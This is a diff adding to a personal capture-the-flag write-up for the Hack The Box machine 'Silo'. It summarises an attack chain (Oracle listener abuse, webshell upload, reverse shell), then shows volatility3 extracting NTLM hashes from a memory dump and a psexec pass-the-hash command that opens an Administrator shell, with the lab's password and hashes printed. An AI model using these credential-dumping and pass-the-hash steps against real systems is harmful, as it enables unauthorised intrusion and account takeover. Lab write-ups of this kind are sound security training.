@@ -1,4 +1,16 @@
+# Story
+- Oracle TNS listener is there, so attack that with odat
+- scott can login the db as sysdba
+- sysdba can upload files, so we upload webshell in webroot
+- run whatever in the webshell, so we can get revshell
+- look for something useful in the machine
+- There is a link for dropbox and we can download memory dump from it
+- use volality3 to get admin hash information
+- we can login using hash as admin
+- get root flag
+
 # Enumeration
+
 ## nmap
 
 ```
@@ -638,3 +650,110 @@ link password:
 ![[Pasted image 20230220144401.png]]
 
 `£%Hm8646uC$`
+
+![[Pasted image 20230220144548.png]]
+
+
+## dumpfile
+```
+file SILO-20180105-221806.dmp
+SILO-20180105-221806.dmp: MS Windows 64bit crash dump, full dump, 261996 pages
+```
+
+## VT
+
+```
+md5sum SILO-20180105-221806.dmp
+04a302e67113e9f02fda3283dace7898  SILO-20180105-221806.dmp
+```
+
+![[Pasted image 20230220145454.png]]
+
+
+## volatility3
+```
+git clone https://github.com/volatilityfoundation/volatility3.git
+```
+
+```
+python3 vol.py -h
+```
+
+```
+python3 vol.py -f ~/Documents/htb/Silo/SILO-20180105-221806.dmp windows.info
+Variable        Value
+
+Kernel Base     0xf8007828a000
+DTB     0x1a7000
+Symbols file:///home/kali/Documents/htb/Silo/volatility3/volatility3/symbols/windows/ntkrnlmp.pdb/A9BBA3C139724A738BE17665DB4393CA-1.json.xz
+Is64Bit True
+IsPAE   False
+layer_name      0 WindowsIntel32e
+memory_layer    1 WindowsCrashDump64Layer
+base_layer      2 FileLayer
+KdVersionBlock  0xf80078520d90
+Major/Minor     15.9600
+MachineType     34404
+KeNumberProcessors      2
+SystemTime      2018-01-05 22:18:07
+NtSystemRoot    C:\Windows
+NtProductType   NtProductServer
+NtMajorVersion  6
+NtMinorVersion  3
+PE MajorOperatingSystemVersion  6
+PE MinorOperatingSystemVersion  3
+PE Machine      34404
+PE TimeDateStamp        Thu Aug 22 08:52:38 2013
+
+```
+
+```
+python3 vol.py -f ~/Documents/htb/Silo/SILO-20180105-221806.dmp windows.hashdump.Hashdump -vvv
+Volatility 3 Framework 2.4.1
+INFO     volatility3.cli: Volatility plugins path: ['/home/kali/Documents/htb/Silo/volatility3/volatility3/plugins', '/home/kali/Documents/htb/Silo/volatility3/volatility3/framework/plugins']
+INFO     volatility3.cli: Volatility symbols path: ['/home/kali/Documents/htb/Silo/volatility3/volatility3/symbols', '/home/kali/Documents/htb/Silo/volatility3/volatility3/framework/symbols']
+DEBUG    volatility3.framework: No module named 'Crypto'
+DEBUG    volatility3.framework: Failed to import module volatility3.plugins.windows.cachedump based on file: /home/kali/Documents/htb/Silo/volatility3/volatility3/framework/plugins/windows/cachedump.py
+DEBUG    volatility3.framework: No module named 'Crypto'
+DEBUG    volatility3.framework: Failed to import module volatility3.plugins.windows.lsadump based on file: /home/kali/Documents/htb/Silo/volatility3/volatility3/framework/plugins/windows/lsadump.py
+DEBUG    volatility3.framework: No module named 'Crypto'
+DEBUG    volatility3.framework: Failed to import module volatility3.plugins.windows.hashdump based on file: /home/kali/Documents/htb/Silo/volatility3/volatility3/framework/plugins/windows/hashdump.py
+```
+
+```
+pip install pycryptodome
+```
+
+```
+python3 vol.py -f ~/Documents/htb/Silo/SILO-20180105-221806.dmp windows.hashdump.Hashdump     
+Volatility 3 Framework 2.4.1
+Progress:  100.00               PDB scanning finished                                
+User    rid     lmhash  nthash
+
+Administrator   500     aad3b435b51404eeaad3b435b51404ee        9e730375b7cbcebf74ae46481e07b0c7
+Guest   501     aad3b435b51404eeaad3b435b51404ee        31d6cfe0d16ae931b73c59d7e0c089c0
+Phineas 1002    aad3b435b51404eeaad3b435b51404ee        8eacdd67b77749e65d3b3d5c110b0969
+```
+
+## root
+```
+python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 -target-ip silo.htb administrator@silo.htb
+Impacket v0.10.1.dev1+20230216.13520.d4c06e7f - Copyright 2022 Fortra
+
+[*] Requesting shares on silo.htb.....
+[*] Found writable share ADMIN$
+[*] Uploading file FZbfCnbH.exe
+[*] Opening SVCManager on silo.htb.....
+[*] Creating service SQKD on silo.htb.....
+[*] Starting service SQKD.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> 
+
+```
+
+
+## Flag
+under `/Users/Administrator/Desktop/root.txt`
